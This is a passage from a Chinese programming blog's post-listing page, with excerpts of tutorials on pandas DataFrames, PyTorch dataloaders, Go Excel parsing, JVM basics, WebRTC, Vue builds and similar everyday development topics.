truncate table user_tests 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a7106a2ef296cad65c6086cb0ee10924/" rel="bookmark">
			如何在 Python 中创建DataFrame
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DataFrame是数据的二维集合。 它是一种数据结构，其中数据以表格形式存储。 数据集按行和列排列； 我们可以在DataFrame中存储多个数据集。 我们可以执行各种算术运算，例如在DataFrame中添加列/行选择和列/行。
我们可以从外部存储导入 DataFrame； 这些存储可以是 SQL数据库、CSV 文件和 Excel 文件。 我们还可以使用列表、字典和来自字典的列表等。
在本教程中，我们将学习以多种方式创建DataFrame。 让我们了解这些不同的方式。
方法一：创建空的DataFrame
我们可以创建一个基本的空DataFrame。 需要调用DataFrame构造函数来创建DataFrame。 让我们理解下面的例子：
输出：
​方法二：使用List 创建DataFrame​
我们可以使用单个列表或列表的列表创建DataFrame。 让我们理解下面的例子：
输出：
​方法三：使用字典创建DataFrame​
ndarray/lists 的 dict 可用于创建DataFrame，所有 ndarray 必须具有相同的长度。 默认情况下，索引将是一个范围（n）； 其中 n 表示数组长度。 让我们理解下面的例子：
输出：
​方法四：使用数组创建带索引DataFrame​
请看下面的示例：
输出：
在上面的代码中，我们定义了包含各种汽车名称及其评级的列名。 我们使用数组来创建索引。
方法五：从字典列表创建DataFrame
我们可以将字典列表作为输入数据传递来创建 Pandas DataFrame。 默认情况下，列名作为键。 让我们理解下面的例子：
输出：
让我们学习另一个示例，从具有行索引和列索引的字典列表创建 pandas DataFrame。
输出：
让我们再来学习另一个通过传递字典和行列表来创建数据框的示例：
输出：
​方法六：使用zip()函数创建DataFrame​
zip() 函数用于合并两个列表。 让我们理解下面的例子。
输出：
​方法七：从序列的字典创建DataFrame​
可以传递字典来创建DataFrame。 我们可以使用序列的字典，其中后续索引是所有传递的索引值序列的并集。 让我们理解下面的例子：
输出：
在本教程中，我们讨论了创建 DataFrame 的不同方法。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/81e13120a02c0679a498828024ee5910/" rel="bookmark">
			pytorch同时让两个dataloader打乱的顺序是相同的
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有两个数据集，一个是干净的，一个是加入了噪声，希望在shuffle=True的情况下取出的数据还是一一对应的。
加载两个数据集：
trainloader_noise=torch.utils.data.DataLoader(trainloader_noise,batch_size=args.batch_size,shuffle=True,num_workers=args.n_cpu,drop_last=True)
trainloader_clean=torch.utils.data.DataLoader(trainloader_clean,batch_size=args.batch_size,shuffle=True,num_workers=args.n_cpu,drop_last=True)
用
for (num,(data_noise,labels)),(num1,(data_clean,labels1)) in zip(enumerate(loader_clean,start=1),enumerate(loader_noise,start=1))取出。
参考pytorch怎么同时让两个dataloader打乱的顺序是相同的？ - 知乎
以及Reproducibility — PyTorch 1.10 documentation
可以在两个dataloader实例化之前加入
g=torch.Generator()
g.manual_seed(0)
然后在dataloader中加入参数g
trainloader_noise=torch.utils.data.DataLoader(trainloader_noise,batch_size=args.batch_size,shuffle=True,num_workers=args.n_cpu,drop_last=True,generator=g)
trainloader_clean=torch.utils.data.DataLoader(trainloader_clean,batch_size=args.batch_size,shuffle=True,num_workers=args.n_cpu,drop_last=True,generator=g)
就可以使得两个dataloader的打乱顺序一致
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9bb6e4d4587edd8dc190daf1b80553f/" rel="bookmark">
			将excel内容解析到golang struct
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		excel映射解析Golang excelize360-mapping-struct: gitee
接触到了一个excel批量导入的需求，网上找了下对于excel的数据的验证解析实在是没找到什么好的工具，找到个360开源库，发现结合需求实现起来还是有些麻烦，毕竟excel千变万化，加上数据还需要做各种校验，但万变不离其宗，回归到代码语言本身上来，分析下数据结构，最好的方式还是映射绑定数据到结构体struct，让编码开发也更加友好。
golang 基于excelize360实现的excel解析工具库,通过结构体字段tag实现映射数据到结构体，并加入了一些预期的错误格式，可根据实际运用情况加入更多错误模板，具体使用方式clone本仓库代码，可直接在本地运行调试。
支持的tag标签 tag属性说明mapping将数据进行转义，一般数据表格中都是以明文输入输出数据，但在实际代码业务中只用0或1表示状态的场景。例：mapping(已完成:1,未完成:2)unique标识唯一性，在同列中唯一。例：unique(true)date时间格式化，该属性分两部分，第一个参数：该单元格的时间日期格式（注意该格式非在数据表格中明文显示的格式，要查看该单元格在excel中的时间格式设置）；第二个参数：将转化到的格式。例：date(01-02-06,2006-01-02)name指定该属性所在字段绑定的excel列名称，一般情况下数据表格都会指定每一列代表的含义，该属性十分重要，也是映射数据的主要参考依据，需要保持excel列名跟name属性保持一致，例：name(*名称) 以上tag属性统一作用在 excel 标签下，如某个字段需要绑定多个属性，属性间用 “;” 分隔。
结构体定义示例：
type Project struct { Name string `json:"project_name" excel:"name(*名称);unique(true)"` StartTime *string `json:"start_time" excel:"name(开始时间);date(01-02-06,2006-01-02)"` Status int `json:"Status" excel:"name(状态);mapping(已完成:1,未完成:2)"` Statistics *Statistics `json:"statistics"` Result struct { Count *int `json:"count" excel:"name(总数)"` } `json:"result"` Time time.Time `json:"time"` } type Statistics struct { Num int `json:"num" excel:"name(数量)"` } 自定义验证接口 工具内置一个接口，可根据需求选择性实现该接口。
type MappingStruct interface { ExcelRowProcess(res *Result) error } 通过已经绑定execl标签的结构体实现接口，可对每一行数据（其实就是可以把该结构体看作是每一行数据的模板，数据进行映射操作时每一行映射完都会调用一次该接口）进行自定义校验或进行数据改值（每一行数据都会自动创建新的指针指向并复制初始指针传入的内容）等操作，说明：如果在实现的接口中需要事务性的操作，可以将相关存储引擎通过初始指针进行传递。
接口实现示例：
func (p *Project) ExcelRowProcess(res *excel.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a9bb6e4d4587edd8dc190daf1b80553f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/867cb3488fb4afddaebbe1ab56dc1fa6/" rel="bookmark">
			全面理解Java内存模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		全面理解Java内存模型_Heaven Wang 的专栏-CSDN博客_java内存模型
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a44d0f22ba96a7dacd9f25984614c642/" rel="bookmark">
			Android9.0 audio_policy_configuration.xml解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考：https://segmentfault.com/a/1190000020109354
frameworks/av/services/audiopolicy/managerdefault/AudioPolicyManager.cpp 的源码：
AudioPolicyManager::AudioPolicyManager(AudioPolicyClientInterface *clientInterface): AudioPolicyManager(clientInterface, false /*forTesting*/) { loadConfig(); initialize(); } void AudioPolicyManager::loadConfig() { //Android7.0之后便使用此宏 #ifdef USE_XML_AUDIO_POLICY_CONF if (deserializeAudioPolicyXmlConfig(getConfig()) != NO_ERROR) { #else if ((ConfigParsingUtils::loadConfig(AUDIO_POLICY_VENDOR_CONFIG_FILE, getConfig()) != NO_ERROR) &amp;&amp; (ConfigParsingUtils::loadConfig(AUDIO_POLICY_CONFIG_FILE, getConfig()) != NO_ERROR)) { #endif ALOGE("could not load audio policy configuration file, setting defaults"); getConfig().setDefault(); } } Android 7之后，通过配置文件USE_XML_AUDIO_POLICY_CONF来控制是使用XML配置的策略文件还是使用传统旧config配置文件。这个变量的初始化可以通过配置文件device.mk进行选择。
deserializeAudioPolicyXmlConfig函数的参数getConfig()即AudioPolicyConfig。getConfig()得到的AudioPolicyConfig mConfig成员变量如下：
AudioPolicyConfig&amp; getConfig() { return mConfig; } mConfig(mHwModulesAll, mAvailableOutputDevices, mAvailableInputDevices, mDefaultOutputDevice, static_cast&lt;VolumeCurvesCollection*&gt;(mVolumeCurves.get())) 这些成员变量在解析配置文件（XML格式或者config格式）会得到初始化，这点很重要，后续的so加载会根据配置的module name来进行加载。
#define AUDIO_POLICY_XML_CONFIG_FILE_NAME "audio_policy_configuration.xml" //xml存放在固件的路径，优先级：/odm/etc &gt; /vendor/etc &gt; /system/etc static const char *kConfigLocationList[] = {"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a44d0f22ba96a7dacd9f25984614c642/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/055035d649132fca4d97045534c56f70/" rel="bookmark">
			LaTex 数学之括号
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 LaTex 数学之括号一些例子控制括号的类型和大小参考指南 LaTex 数学之括号 括号和方括号在数学公式中非常常见。您可以轻松控制L A T E X中括号的大小和样式；这篇文章解释了如何。
下表列出了L A T E X中使用的一些常用数学大括号和括号：
类型L A T E X标记呈现括号; 圆括号(x+y)( x + y)括号; 方括号[x+y][ x + y]大括号；大括号\{ x+y \}{ x + y}尖括号\langle x+y \rangle⟨ x + y⟩绝对值（单竖）|x+y||x+y|模值（双竖）\|x+y\| ∥ x + y ∥ \|x+y\| ∥x+y∥ 一些例子 方括号和圆括号的大小可以手动设置，也可以在文档中动态调整大小，如下例所示：
\[ F = G \left ( \frac {m_ 1 m_ 2 }{r^ 2 } \right )\] 请注意，要插入圆括号或方括号，请使用\left和\right命令。即使您只使用一个括号，这两个命令也是强制性的。\left并且\right可以动态调整大小，如下例所示：
\[ \left [ \frac { N } { \left ( \frac {L}{p} \right ) - ( m + n ) } \right ] \] 使用align、align*或者aligned环境编写多行方程时， \left和\right命令必须在每行的&amp;同一侧 保持平衡。因此，以下代码段将失败并出现错误：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/055035d649132fca4d97045534c56f70/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d7d6c46b52521f8505e440d2c60c4547/" rel="bookmark">
			关于JVM(基本常识)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、JVM是什么
1、概述
二、为什么要用JVM
1、java程序的执行流程
2、JVM的架构
一、JVM是什么 1、概述 关于JVM，在百度上的解释为：JVM是Java Virtual Machine（Java虚拟机）的缩写，JVM是一种用于计算设备的规范，它是一个虚构出来的计算机，是通过在实际的计算机上仿真模拟各种计算机功能来实现的。引入Java语言虚拟机后，Java语言在不同平台上运行时不需要重新编译。Java语言使用Java虚拟机屏蔽了与具体平台相关的信息，使得Java语言编译程序只需生成在Java虚拟机上运行的目标代码（字节码），就可以在多种平台上不加修改地运行。
简单地说，JVM是《JVM虚拟机规范》中提出来的规范，并不是具体实现，相当于“接口”，而真正实现他的是形如HotSport的“实现类”。
从百度的定义来看，我们可以发现：JVM并不是只为Java语言服务，而是针对字节码文件，只要是字节码文件，JVM就支持。
像java语言自不必说，还有大数据开发常用的Scala语言，Groovy语言，python等其他语言经过处理也可以转换成字节码文件，从而在JVM环境中运行。
二、为什么要用JVM 1、java程序的执行流程 程序执行的方式一般有三种，包括静态编译执行、动态编译执行、动态解释执行。编译指的是将程序编译成可让操作系统直接执行的机器码。在java语言中，程序的执行方式是以动态解释为主，动态编译为辅（静态编译执行类似C语言，编译成可执行文件（windows一般是exe，Linux一般为sh），里面存的都是机器码）。
1.1字节码与机器码的区别：
机器码：是CPU直接读取的机器指令，运行速度非常快。
字节码：一种中间状态的二进制文件，需要直译器转译后才能变成机器码。 1.2执行流程图：
如上图得出一个结论：java程序编译成的字节码文件可以做到一次编译到处使用，字节码不分操作系统，而不同的操作系统的JVM是不同的，所以只要是字节码，就能在不同的平台由不同的JVM解释成为机器码进行运行使用，所以为什么jdk的下载区分操作系统，这也体现了java语言的（.class字节码文件）强大的跨平台性和可移植性。。
1.3JDK、KRE、JVM之间的关系
JDK主要包括了编译器等开发工具和JRE两部分，JRE包含了JVM和运行类库。
有关OpenJDK和OracleJDK的区别
在命令行中使用命令 java -version 通过查看结果进行区分
①若为下图所示：
则表示该JDK为OracleJDK，其中HotSpot为JVM的实现，HotSpot为JVM规范的商用产品，除此之外还有Oracle JRockit、IBM的J9；Server为该JVM的运行模式，JVM有两种运行模式，分别为Client模式和Server模式；对于这两种模式，他们是互补的关系，区别在于Client模式启动速度较快，Server模式启动较慢； 但是启动进入稳定期长期运行之后Server模式的程序运行速度比Client要快很多。 因为Server模式启动的JVM采用的是重量级的虚拟机，对程序进行了更多的优化；而Client模式启动的JVM采用的是轻量级的虚拟机。所以Server启动慢，但稳定后速度比Client远远要快。
②若结果为
openjdk version " 1.8.0_144 " OpenJDK Runtime Environment (build 1.8.0_144 - b01) OpenJDK 64 - Bit Server VM (build 25.144 - b01, mixed mode)，则为OpenJDK，OpenJDK和OracleJKD的区别主要在于：OpenJDK最早为SUN公司进行开发维护，在SUN公司被Oracle公司收购之后，Oracle也就成了唯一的维护者，OracleJDK是在OpenJdk的基础上构建实现的，他们之间的技术差别其实并不大；OpenJDK可免费商用，而OracleJKD个人使用免费，商用需要付费。 2、JVM的架构 2.1基于JVM架构的JVM程序执行流程：
首先，由java编译器（javac）将java源代码.java文件编译成为java字节码.class文件，该字节码文件可能存在于网络、内存、硬盘等地方，而JVM都有方式可以将其加载到类装载器中，进行字节码验证等操作，若为非法字节码文件，则会被丢弃，之后再通过对于热点代码的判断，在java解释器和即时编译器之间进行协调选择执行，然后转换成操作系统可识别的机器码运行程序。
2.2java解释器和编译器（JIT）之间的协调配合流程：
在一些商用JVM实现中（这里举例HotSpot） ，字节码转换为机器码的操作最初是由解释器interpretor执行的，但是当一个代码或者代码块执行的次数（如一个方法的频繁调用和循环体的多次执行）很多时，如果每次都进行解释，那么对于空间会造成浪费和拥挤，也会降低JVM的性能，导致程序的执行缓慢，而JIT（Just In Time Compiler）很好的解决了这个问题，在JIT中（参照上图的JVM架构图），探测器检测并判断哪些代码为热点代码，并标记，然后将他们编译成与本地平台相关的机器码，并进行代码的优化，提高了程序执行的效率；JIT是属于在运行时进行编译的动态编译，这种编译方市因为编译发生在方法执行过程之中，因此形象的称为栈上替换（On Stack Replacement，OSR），即方法栈帧还在栈上，方法就被替换 了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d7d6c46b52521f8505e440d2c60c4547/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee33b115bed9885e91c6e042a76ce52d/" rel="bookmark">
			使用wangeditor遇到的坑，插入视频只显示音频
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天在用wangeditor的时候插入视频之后只显示音频。
然后看了标签页确实是video标签。
这个视频是我用QQ自带的录屏录的，
最后查阅资料发现video标签 支持的编码方式是h264
视频格式 首先 video 标签只支持MPEG4，Ogg，WebM 三种视频格式，浏览器支持情况如下： 但是，video标签对这三种视频格式是有具体要求的
Ogg = 带有 Theora 视频编码 + Vorbis 音频编码 MPEG4 = 带有 H.264 视频编码 + AAC 音频编码 WebM = 带有 VP8 视频编码 + Vorbis 音频编码
所以，就找到问题的原因了，不能被播放的mp4的视频，视频的编码格式不是 h264。
利用格式工厂对mp4视频，用h264视频编码格式重新编码，得到的视频就可以使用了。 不得不说，html5 的 video 标签 对视频的限制太大了，还有待于改善提高。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0256f9997521ce52b3ae32ebc8500bf2/" rel="bookmark">
			web技术分享| WebRTC控制摄像机平移、倾斜和缩放
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MediaDevices.getUserMedia() 会提示用户给予使用媒体输入的许可，媒体输入会产生一个MediaStream，里面包含了请求的媒体类型的轨道。此流可以包含一个视频轨道（来自硬件或者虚拟视频源，比如相机、视频采集设备和屏幕共享服务等等）、一个音频轨道（同样来自硬件或虚拟音频源，比如麦克风、A/D转换器等等），也可能是其它轨道类型。
它返回一个 Promise 对象，成功后会resolve回调一个 MediaStream 对象。若用户拒绝了使用权限，或者需要的媒体源不可用，promise会reject回调一个 PermissionDeniedError 或者 NotFoundError 。
参数 constraints
constraints 参数是一个包含了video 和 audio两个成员的MediaStreamConstraints 对象，用于说明请求的媒体类型。必须至少一个类型或者两个同时可以被指定。如果浏览器无法找到指定的媒体类型或者无法满足相对应的参数要求，那么返回的Promise对象就会处于rejected［失败］状态，NotFoundError作为rejected［失败］回调的参数。
const constraints = { video: { pan: true, tilt: true, zoom: true } }; async function init(e) { try { const stream = await navigator.mediaDevices.getUserMedia(constraints); handleSuccess(stream); e.target.disabled = true; } catch (e) { handleError(e); } }; document.querySelector('#showVideo').addEventListener('click', e =&gt; init(e)); getVideoTracks() 方法 返回代表此流中视频轨道 MediaStream的对象序列 。MediaStreamTrack
一组MediaStreamTrack对象，媒体流中包含的每个视频轨道都有一个对象。视频轨道是那些 kind属性为的轨道video。如果流不包含视频轨道，则该数组为空。 getCapabilities方法返回一个 MediaTrackCapabilities 对象，此对象表示每个可调节属性的值或者范围，该特性依赖于平台和user agent.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0256f9997521ce52b3ae32ebc8500bf2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e91411d13064861ffc5ff28b6b54119/" rel="bookmark">
			FTPClient文件上传与下载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		package com.founder.mrp.util; import com.founder.mrp.util.storage.StorageFile; import org.apache.commons.net.ftp.FTPClient; import org.apache.commons.net.ftp.FTPReply; import java.io.*; import java.net.HttpURLConnection; import java.net.SocketException; import java.net.URL; public class FtpUtil { /** * 获取FTPClient对象 * * @param ftpHost FTP主机服务器 * @param ftpPassword FTP 登录密码 * @param ftpUserName FTP登录用户名 * @param ftpPort FTP端口 默认为21 * @return */ public static FTPClient getFTPClient(String ftpHost, String ftpUserName, String ftpPassword, int ftpPort) { FTPClient ftpClient = new FTPClient(); try { ftpClient = new FTPClient(); ftpClient.connect(ftpHost, ftpPort);// 连接FTP服务器 ftpClient.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5e91411d13064861ffc5ff28b6b54119/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/50261f102f1da445cf8df76139f79380/" rel="bookmark">
			Android 接入阿里云推送com.aliyun.ams:alicloud-android-push:3.7.4步骤（二）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		10.混淆配置在proguard-rules.pro文件中增加
-keepclasseswithmembernames class ** { native &lt;methods&gt;; } -keepattributes Signature -keep class sun.misc.Unsafe { *; } -keep class com.taobao.** {*;} -keep class com.alibaba.** {*;} -keep class com.alipay.** {*;} -keep class com.ut.** {*;} -keep class com.ta.** {*;} -keep class anet.**{*;} -keep class anetwork.**{*;} -keep class org.android.spdy.**{*;} -keep class org.android.agoo.**{*;} -keep class android.os.**{*;} -keep class org.json.**{*;} -dontwarn com.taobao.** -dontwarn com.alibaba.** -dontwarn com.alipay.** -dontwarn anet.** -dontwarn org.android.spdy.** -dontwarn org.android.agoo.** -dontwarn anetwork.** -dontwarn com.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/50261f102f1da445cf8df76139f79380/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9aa2b5364244cb243edb1e419aba4b3/" rel="bookmark">
			利用re实现修改测试用例格式——python实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		利用re实现修改测试用例格式——python实现 前言 还记得我上一篇关于leetcode的那道蜡烛之间盘子计数的blog嘛，不知道的可以去了解一下，附上blog地址。
Leetcode每日一题（2022.3.8） - 物联黄同学的博客 | HI Blog (wulianhuangtonxue.github.io)
(2条消息) Leetcode每日一题（2022.3.8）—— 2005 蜡烛之间的盘子（前缀和）_物联黄同学的博客-CSDN博客
而我平时会将这些题目录下来，放到学校的oj服务器上，在这个的过程中，除了需要复制题目内容，编写完整的code外，还要录入一些测试用例，这些测试用例可以自己测试，我曾经写过一篇关于使用洗牌算法生成测试用例的方法，有兴趣的也可以去看看。
(2条消息) 随机洗牌算法构造测试用例_物联黄同学的博客-CSDN博客
使用随机洗牌算法构造测试用例 - 物联黄同学的博客 | HI Blog (wulianhuangtonxue.github.io)
除了自己设计测试用例，leetcode也会提供题目的一些用例，首先是题目本身就会显示的几个样例，然后在你提交代码不通过时，也会返回一些用例，我们可以直接使用这些用例，相对来说会比自己设计要方便很多。但是，leetcode提供的测试用例，往往会有一些格式的问题，这些格式其实可以手动修改，但是我比较懒，拒绝这样做，于是便有了这篇blog。
问题简述 我们还是那道蜡烛盘子问题为例。
先看下它的一个测试用例（leetcode原生）
“||||||*”
[[1,17],[4,5],[14,17],[5,11],[15,16]]
然后我在oj上对这道题的输入和输出要求是这样的
我们当然可以自己修改输入或者输出的要求，但是录题是为了帮助其他同学练习，难道要为难他们要去专门输入像leetcode格式那样的字符串带双引号，数组带方括号？
显然，作为录题人，我觉得应该自己处理这些用例的格式，正好之前包括最近都在做一个使用python的re模块的项目，所以我便想到了，是不是可以编写一个程序实现对测试样例的内容的修改。
当然很多人可能会想这其实可以手动修改格式，去除一些符号，然后换行罢了，没必要专门写一个程序吧？那么，还记得这道题，使用暴力模拟为什么过不了，因为超时，为什么会超时，因为leetcode给了一个非常大的测试用例，可以通过下面的图片感受一下它的庞大与恐怖
这只是字符串的部分，数组的更多，看到这个测试用例的时候，我是崩溃的，我只能说leetcode算你狠，难怪模拟过不了。所以，面对这种数量非常庞大的数据，我们手动操作的话可能会直接寄。作为一个热爱编程的程序员，我们的任务就应该是将化繁为简，所以我就写了一个程序demo来实现。
方法介绍 re模块 我在代码中主要使用了re模块，这是正则表达式模块，很多语言都有该模块的库，而在python中该模块的库就叫re。
正则表达式是一种用于识别字符串的方法，通过正则表达式，我们可以更加高效地识别检测字符串的内容。
而关于python re库的更多内容，大家可以直接搜索了解，有机会的话我也会整理一下它的知识点。
我们在这个demo中主要使用了下列的三个函数
complie（str）：将str字符串编译成正则表达式对象
match（表达式，str）：对str字符串进行正则表达式匹配，匹配到第一个内容为止，如果匹配不到，则会返回None
对象.sub（str1，str2）: 利用正则表达式对象对str2进行检测，将检测到的部分替换为str1，默认检测到str2的所有。
os模块和文件操作 除了使用到re模块，我们在该程序中还使用了python的文件操作和OS模块，这里不细写了，只写一个用到的函数。
os.listdir（path）：将path下的文件以列表的形式返回
需要的材料 我们可以使用记事本将leetcode上的用例复制粘贴然后保存到相应的路径下，比如下面这样。
code（python） import re import os def ModifyContent(path): """ 修改文件的内容 面向txt文件 主要事leetcode的测试样例往往有双引号和方括号 该篇主要用于处理这些变成我们熟悉的样例 :param path: 文件地址 :return: """ # 打开文件 file = open(path, 'r+') # 读取文件内容 content = file.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a9aa2b5364244cb243edb1e419aba4b3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9898f1788e5dac74ec75eff126134435/" rel="bookmark">
			结构体【struct】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		结构体：
结构是一些值的集合，这些值称为成员变量。结构的每个成员可以是不同类型的变量。
struct tag { member-list; }variable-list; 例如一个学生：
struct Stu { char name[20];//名字 int age;//年龄 char sex[5];//性别 char id[20];//学号 }; //分号不能丢 但是我们初识化的时候还会有点小细节：
struct Stu { char name[20];//名字 int age;//年龄 char sex[5];//性别 char id[20];//学号 }s2,s3,s4; //分号不能丢 //s2,s3,s4是全局变量 struct Stu s5;//全局变量 int main() { struct Stu s1;//结构体变量 return 0; } 特殊的声明
在声明结构的时候，可以不完全声明。
如：
//匿名结构体类型 struct { int a; char b; float c; }x; struct { int a; char b; float c; }a[20], * p; int main() { p = &amp;x; return 0; } 首先第一个结构我们没有名字，这样我们只能在变量列表设置变量。这个时候我们的结构体类型就只能在变量列表设置变量。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9898f1788e5dac74ec75eff126134435/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dd0cb1e96e99536024f3567e27b3b367/" rel="bookmark">
			Python:求最大公约数与最小公倍数（辗转相除与递归两种方法）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		导读 最大公因数，也称最大公约数、最大公因子，指两个或多个整数共有约数中最大的一个。a，b的最大公约数记为（a，b），同样的，a，b，c的最大公约数记为（a，b，c），多个整数的最大公约数也有同样的记号。求最大公约数有多种方法，常见的有质因数分解法、短除法、辗转相除法、更相减损法。与最大公约数相对应的概念是最小公倍数，a，b的最小公倍数记为[a，b]
欧几里得算法 欧几里得算法又称辗转相除法，是指用于计算两个非负整数a，b的最大公约数。应用领域有数学和计算机两个方面。计算公式gcd(a,b) = gcd(b,a mod b)。
递归算法 （英语：recursion algorithm）在计算机科学中是指一种通过重复将问题分解为同类的子问题而解决问题的方法。递归式方法可以被用于解决很多的计算机科学问题，因此它是计算机科学中十分重要的一个概念。绝大多数编程语言支持函数的自调用，在这些语言中函数可以通过调用自身来进行递归。计算理论可以证明递归的作用可以完全取代循环，因此在很多函数编程语言（如Scheme）中习惯用递归来实现循环。
解释摘自百度百科侵权请于联系。
方法一 a = int(input("请输入第一个整数")) # 1997 b = int(input("请输入第二个整数")) # 615 y = -1 # 余数 先假设 re = -1 # 除数 def qiou(a, b): global y # 因为是全局变量需要声明 global re while y != 0: # 当y为0 的时候跳出循环 y = a % b re = b qiou(b, y) qiou(a, b) print("最大公约数{}".format(re)) # 输出最大公约数. # 最小公倍数=(a*b)/最大公约数 gbs = (a * b) / re print("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dd0cb1e96e99536024f3567e27b3b367/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3421f4d8676d4efcf7d1bcc2000b391b/" rel="bookmark">
			ModuleNotFoundError：No module named ‘pyecharts‘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ModuleNotFoundError：No module named ‘pyecharts’# 项目场景：
问题描述 pycharm运行项目出现以下问题：
ModuleNotFoundError：No module named 'pyecharts' 原因分析： 当前python版本里面没有pyecharts模块
解决方案： 方法一是直接打开cmd，输入以下命令行。但我在用这个方法的时候还是下载失败，所以可以直接用方法二。
pip install pyecharts 方法二用国内镜像下载，这里用的是清华镜像。
pip install -i https://pypi.tuna.tsinghua.edu.cn/simple/ pyecharts 如果下载失败会出现Error的提示。下载后，可以用命令行验证是否下载成功：
pip list 下载成功可以找到pyecharts
再重新运行一遍项目就可以了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/85de2739099a5edb41faeffb4ff48883/" rel="bookmark">
			Asp.Net Core6 WebSocket绑定
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、Asp.Net Core6 WebSocket绑定
使用中间件绑定WebSocket
app.UseWebSockets(); app.Map("/upload/common", (con) =&gt; { con.UseWebSockets();//启用webscoket con.Use(async (ctx, next) =&gt; { Receiver _receive = new Receiver(ctx, "upload/images"); _receive.OnSuccess += (data) =&gt; { }; _receive.OnError += (ex) =&gt; { int i = 10; }; await _receive.DoWork(); await next.Invoke(); }); }); 更多：
ASP.NET Core SignalR.NET 客户端 Asp.Net Core 3.1 SignalR 启动配置变化 HTML5 WebSocketAPI实例(二) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ef61949ece78ce42fb36513385853a0c/" rel="bookmark">
			【Vue】下载依赖包node_modules &amp; 打包项目
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、下载依赖包node_modules 拷贝或上传一份Vue的代码时，通常会删掉依赖包node_modules,
因为这个包太大了，而且运行项目的时候，如果没有依赖包，重新下载就可以。
操作步骤：
1.上传时把项目中的node_modules依赖包文件夹删掉。
2.输入命令行下载依赖包node_modules：npm install 。如下所示：
3.等npm install运行结束后，依赖包就已经下载好了。
4.运行。最后就可以用npm run dev来运行vue项目了。
二、打包项目 1.运行命令：npm run build
打包完成后，可以看到有提示build complete
2.build完成后可以在项目中发现多了一个dist文件夹，里面包括一个css文件，js文件和index.html
3.项目最终上线的内容是打包压缩的，也就是dist文件。
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/292/">«</a>
	<span class="pagination__item pagination__item--current">293/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/294/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
